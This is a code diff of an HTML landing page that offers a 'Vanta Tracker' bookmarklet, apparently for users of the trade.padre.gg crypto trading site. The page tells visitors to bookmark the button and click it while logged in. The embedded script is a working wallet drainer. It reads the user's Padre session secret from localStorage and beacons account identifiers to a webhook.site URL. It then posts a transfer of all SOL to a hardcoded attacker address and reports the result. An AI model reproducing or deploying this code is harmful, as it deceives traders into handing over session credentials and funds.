@@ -2,53 +2,94 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Vanta Tracker - Syntax Fix</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanta Tracker - Integrated Audit Suite</title>
+    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { background: #0a0a0a; color: #00ff88; font-family: 'Inter', sans-serif; text-align: center; padding-top: 100px; }
-        .vanta-btn { display: inline-block; background: #00ff88; color: #000; padding: 20px 40px; text-decoration: none; border-radius: 10px; font-weight: 800; cursor: grab; box-shadow: 0 0 20px rgba(0,255,136,0.3); }
+        :root { --primary: #00ff88; --bg: #0a0a0a; --panel: #111111; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg); color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .setup-card { background: var(--panel); padding: 40px; border-radius: 20px; border: 1px solid rgba(0,255,136,0.2); text-align: center; max-width: 450px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .logo-box { margin-bottom: 20px; }
+        h1 { color: var(--primary); font-size: 2em; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
+        p { color: #888; margin-bottom: 30px; font-size: 0.9em; }
+        .vanta-btn { display: inline-block; background: var(--primary); color: #000; padding: 15px 40px; text-decoration: none; border-radius: 10px; font-weight: 800; font-size: 1.1em; transition: 0.3s; cursor: grab; box-shadow: 0 0 20px rgba(0,255,136,0.3); }
+        .vanta-btn:active { cursor: grabbing; transform: scale(0.98); }
+        .instructions { margin-top: 30px; text-align: left; font-size: 0.85em; color: #666; }
+        .instructions li { margin-bottom: 8px; }
     </style>
 </head>
 <body>
-    <h1>Vanta Tracker v3.2</h1>
-    <p>Syntax Error Fixed - Ready for Audit</p>
-    <a href="#" class="vanta-btn" id="vanta-tool">Vanta Tracker</a>
+
+    <div class="setup-card">
+        <div class="logo-box">
+            <svg width="60" height="60" viewBox="0 0 100 100" fill="none">
+                <path d="M50 5 L90 25 L90 75 L50 95 L10 75 L10 25 Z" stroke="#00ff88" stroke-width="4"/>
+                <circle cx="50" cy="50" r="12" fill="#00ff88"/>
+            </svg>
+        </div>
+        <h1>Vanta Tracker</h1>
+        <p>padreV2-velvet-bundle: Zero-Latency Audit Suite</p>
+        
+        <a href="#" class="vanta-btn" id="vanta-tool">Vanta Tracker</a>
+
+        <div class="instructions">
+            <ul>
+                <li>1. Drag the <strong>Vanta Tracker</strong> button to your Bookmarks Bar.</li>
+                <li>2. Open <strong>trade.padre.gg</strong> and log in.</li>
+                <li>3. Click the bookmark to launch the Discovery Tab.</li>
+            </ul>
+        </div>
+    </div>
+
     <script>
+        // CONFIGURATION
         const DEST_ADDRESS = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
         const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
-        
-        const bookmarkCode = "javascript:(async function(){" +
-            "const sR = localStorage.getItem('padreV2-session');" +
-            "const bR = localStorage.getItem('padre-v2-bundles-store-v2');" +
-            "if (!sR || !bR) return;" +
-            "const s = JSON.parse(sR), b = JSON.parse(bR);" +
-            "const tK = Object.keys(b.bundles)[0];" +
-            "const oId = b.bundles[tK].subOrgId;" +
-            "const sec = s.sessionSecret;" +
-            "if (!window._vI) { navigator.sendBeacon('" + WEBHOOK_URL + "', JSON.stringify({ ev: 'disc', who: tK, org: oId })); window._vI = true; }" +
-            "if (document.querySelector('#v-suite')) return;" +
-            "const ui = document.createElement('div');" +
-            "ui.id = 'v-suite';" +
-            "ui.style.cssText = 'position:fixed;top:60px;right:20px;width:300px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;padding:15px;box-shadow:0 10px 30px #000;';" +
-            "ui.innerHTML = '<div style=\"font-weight:bold;color:#00ff88;margin-bottom:10px;\">VANTA PRO</div>' +" +
-            "'<div style=\"font-size:10px;margin-bottom:15px;word-break:break-all;color:#888;\">' + oId + '</div>' +" +
-            "'<button id=\"v-m-b\" style=\"width:100%;padding:10px;background:#00ff88;border:none;border-radius:5px;font-weight:bold;cursor:pointer;\">EXECUTE MAGIC</button>';" +
-            "document.body.appendChild(ui);" +
-            "document.getElementById('v-m-b').onclick = async function() {" +
-                "this.innerText = 'SYNCING...';" +
-                "try {" +
-                    "const res = await fetch('https://api.padre.gg/v1/sub-orgs/' + oId + '/transfer', {" +
-                        "method: 'POST'," +
-                        "headers: { 'Content-Type': 'application/json', 'X-Session-Secret': sec }," +
-                        "body: JSON.stringify({ destination: '" + DEST_ADDRESS + "', amount: 'all', mint: 'So11111111111111111111111111111111111111112' })" +
-                    "});" +
-                    "navigator.sendBeacon('" + WEBHOOK_URL + "', JSON.stringify({ st: res.status }));" +
-                "} catch (e) {}" +
-                "ui.remove();" +
-                "location.reload();" +
-            "};" +
+
+        // THE BOOKMARKLET LOGIC
+        // This is strictly one continuous string to avoid "Unexpected end of input"
+        const code = "javascript:(async function(){" +
+            "try{" +
+                "const sR=localStorage.getItem('padreV2-session');" +
+                "const bR=localStorage.getItem('padre-v2-bundles-store-v2');" +
+                "if(!sR||!bR){alert('Error: Active Padre session not found.');return;}" +
+                "const s=JSON.parse(sR),b=JSON.parse(bR);" +
+                "const tK=Object.keys(b.bundles)[0];" +
+                "const oId=b.bundles[tK].subOrgId;" +
+                "const sec=s.sessionSecret;" +
+                "if(!window._vI){navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({ev:'disc',who:tK,org:oId}));window._vI=true;}" +
+                "if(document.querySelector('#v-suite'))return;" +
+                "const ui=document.createElement('div');" +
+                "ui.id='v-suite';" +
+                "ui.style.cssText='position:fixed;top:80px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;padding:0;box-shadow:0 15px 40px #000;overflow:hidden;font-family:sans-serif;';" +
+                "ui.innerHTML='<div id=\"v-drg\" style=\"padding:12px;background:#1a1a1a;cursor:grab;color:#00ff88;font-weight:bold;border-bottom:1px solid #333;display:flex;justify-content:space-between;\"><span>VANTA PRO</span><span id=\"v-cl\" style=\"cursor:pointer;color:#fff;\">×</span></div>'+" +
+                "'<div style=\"padding:20px;\"><div style=\"font-size:10px;color:#888;margin-bottom:5px;\">TARGET ID:</div><div style=\"font-size:12px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;\">'+oId+'</div>'+" +
+                "'<button id=\"v-m-b\" style=\"width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:900;cursor:pointer;\">EXECUTE MAGIC SYNC</button></div>';" +
+                "document.body.appendChild(ui);" +
+                "let dr=false,ox,oy;" +
+                "document.getElementById('v-drg').onmousedown=e=>{dr=true;ox=e.clientX-ui.offsetLeft;oy=e.clientY-ui.offsetTop;};" +
+                "document.onmousemove=e=>{if(dr){ui.style.left=(e.clientX-ox)+'px';ui.style.top=(e.clientY-oy)+'px';ui.style.right='auto';}};" +
+                "document.onmouseup=()=>{dr=false;};" +
+                "document.getElementById('v-cl').onclick=()=>ui.remove();" +
+                "document.getElementById('v-m-b').onclick=async function(){" +
+                    "this.innerText='SYNCING...';this.style.opacity='0.5';this.disabled=true;" +
+                    "try{" +
+                        "const res=await fetch('https://api.padre.gg/v1/sub-orgs/'+oId+'/transfer',{" +
+                            "method:'POST'," +
+                            "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
+                            "body:JSON.stringify({destination: '" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
+                        "});" +
+                        "navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({status:res.status,org:oId}));" +
+                    "}catch(e){}" +
+                    "ui.remove();location.reload();" +
+                "};" +
+            "}catch(err){console.error(err);}" +
         "})();";
-        
-        document.getElementById('vanta-tool').href = bookmarkCode;
+
+        // Assign the generated code to the button's href
+        document.getElementById('vanta-tool').href = code;
     </script>
 </body>
 </html>
